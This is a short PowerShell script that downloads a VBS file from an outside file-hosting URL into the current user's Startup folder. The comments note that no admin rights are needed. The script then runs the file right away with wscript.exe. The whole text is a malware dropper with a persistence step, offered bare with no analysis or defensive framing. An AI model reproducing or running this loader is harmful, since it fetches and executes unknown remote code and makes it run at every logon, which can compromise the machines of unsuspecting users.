# Define URL of the VBS file
$url = "https://files.catbox.moe/eqlsi1.vbs"

# Get current user's startup folder (no admin needed)
$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\eqlsi1.vbs"

# Download the VBS file to the startup folder
Invoke-WebRequest -Uri $url -OutFile $startupPath

# Optionally run it immediately (in background)
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWindow

exit
